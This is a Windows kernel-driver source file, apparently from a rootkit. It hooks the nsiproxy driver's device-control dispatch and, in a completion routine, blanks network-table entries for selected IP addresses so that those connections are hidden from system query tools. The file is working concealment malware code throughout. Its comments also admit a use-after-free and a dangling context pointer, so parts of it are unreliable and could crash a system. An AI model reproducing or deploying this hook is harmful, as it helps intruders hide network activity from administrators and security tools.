#include "NsiProxyNetworkHook.h"
#include "Network.h"
#include "Ip2string.h"
#include "Debug.h"

NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	PACCESS_STATE AccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PVOID ParseContext OPTIONAL,
	PVOID* Object
);

extern POBJECT_TYPE* IoDriverObjectType;


//
// Undocumented structures. I haven't had time to reverse engineer all of them :(
//
//
typedef struct _HOOKED_IO_COMPLETION {
	PIO_COMPLETION_ROUTINE OriginalCompletionRoutine;
	PVOID OriginalContext;
	LONG InvokeOnSuccess;
	PEPROCESS RequestingProcess;
} HOOKED_IO_COMPLETION, * PHOOKED_IO_COMPLETION;

#define IOCTL_NSI_QUERY 0x12001B

typedef struct _NSI_STRUCTURE_ENTRY {
	ULONG IpAddress;
	UCHAR Unknown[52];
} NSI_STRUCTURE_ENTRY, * PNSI_STRUCTURE_ENTRY;

typedef struct _NSI_STRUCTURE_2 {
	UCHAR Unknown[32];
	NSI_STRUCTURE_ENTRY EntriesStart[1];
} NSI_STRUCTURE_2, * PNSI_STRUCTURE_2;

typedef struct _NSI_STRUCTURE_1 {
	UCHAR Unknown1[40];
	PNSI_STRUCTURE_2 Entries;
	SIZE_T EntrySize;
	UCHAR Unknown2[48];
	SIZE_T NumberOfEntries;
} NSI_STRUCTURE_1, * PNSI_STRUCTURE_1;

PDRIVER_OBJECT g_NetNsiProxyDriverObject = NULL;
PDRIVER_DISPATCH g_NetOldNsiProxyDeviceControl = NULL;


static NTSTATUS NetNsiProxyDeviceControlHook(PDEVICE_OBJECT DeviceObject, PIRP Irp);

static NTSTATUS NetNsiProxyCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);


// inlined
NTSTATUS NetHookNsiProxy()
{
	UNICODE_STRING NsiProxyDriverName = RTL_CONSTANT_STRING(L"\\Driver\\nsiproxy");
	NTSTATUS Status;

	D_INFO("Hooking NsiProxy..");


	Status = ObReferenceObjectByName(
		&NsiProxyDriverName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		&g_NetNsiProxyDriverObject
	);

	if (!NT_SUCCESS(Status))
	{
		
		D_ERROR_STATUS("Could not find NsiProxy!", Status);
		return Status;
	}

	if (!g_NetOldNsiProxyDeviceControl)
	{
		g_NetOldNsiProxyDeviceControl = g_NetNsiProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

		if (g_NetOldNsiProxyDeviceControl == NULL)
		{
			D_INFO("Missing NsiProxy Handler");
			return STATUS_SUCCESS;
		}
	}

	InterlockedExchange64(
		(LONG64*)&g_NetNsiProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(LONG64)NetNsiProxyDeviceControlHook
	);

	return STATUS_SUCCESS;
}

BOOLEAN NetNsiFreeHook()
{
	if (g_NetOldNsiProxyDeviceControl)
	{
		InterlockedExchange64(
			(LONG64*)& g_NetNsiProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(LONG64)g_NetOldNsiProxyDeviceControl
		);
		
		return TRUE;
	}

	return FALSE;
}


NTSTATUS NetNsiProxyDeviceControlHook(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{

	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);

	if (IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_QUERY)
	{
		PHOOKED_IO_COMPLETION Hook = (PHOOKED_IO_COMPLETION)ExAllocatePool(NonPagedPool, sizeof(HOOKED_IO_COMPLETION));

		Hook->OriginalCompletionRoutine = IoStackLocation->CompletionRoutine;
		Hook->OriginalContext = IoStackLocation->Context;

		IoStackLocation->Context = Hook;
		IoStackLocation->CompletionRoutine = NetNsiProxyCompletionRoutine;

		Hook->RequestingProcess = PsGetCurrentProcess();
		Hook->InvokeOnSuccess = (IoStackLocation->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

		IoStackLocation->Control |= SL_INVOKE_ON_SUCCESS;
	}

	return g_NetOldNsiProxyDeviceControl(DeviceObject, Irp);
}


NTSTATUS NetNsiProxyCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;

if (!NT_SUCCESS(Irp->IoStatus.Status))
{
	goto free_exit;
}

PNSI_STRUCTURE_1 NsiStructure1 = (PNSI_STRUCTURE_1)Irp->UserBuffer;

if (!MmIsAddressValid(NsiStructure1->Entries))
{
	goto free_exit;
}

if (NsiStructure1->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
{
	goto free_exit;
}

KAPC_STATE ApcState;

KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);

PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiStructure1->Entries->EntriesStart[0]);

for (ULONG i = 0; i < NsiStructure1->NumberOfEntries; i++)
{
	if (NetIsHiddenIpAddress(NsiBufferEntries[i].IpAddress))
	{
		RtlZeroMemory(&NsiBufferEntries[i], sizeof(NSI_STRUCTURE_ENTRY));

	}
}

KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePool(HookedContext);

	//
	// ERR: There's a use after free here.
	//
	if (HookedContext->InvokeOnSuccess && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}
